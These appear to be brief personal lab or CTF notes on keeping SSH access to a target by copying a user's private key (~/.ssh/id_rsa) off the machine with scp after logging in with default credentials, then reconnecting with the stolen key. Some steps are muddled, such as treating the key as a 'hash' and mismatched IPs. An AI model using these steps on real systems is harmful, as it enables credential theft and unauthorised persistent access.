- connect via ssh
- ssh student@10.20.3.23
pass: student
- cd .ssh/id_rsa
- copy the hash
	- or we can use scp 
		- scp student@10.10.10.10:~/.ssh/id_rsa .
- rm wait (to trigger reset system)
- exit
now we have ssh hash so even if admin changed password of user student we can still connect with ssh using id_rsa 
SSH into the target machine with the private key
- nano id_rsa
- paste hash
- chmod 400 id_rsa
- ssh -i id_rsa student@10.10.10.10
- connected
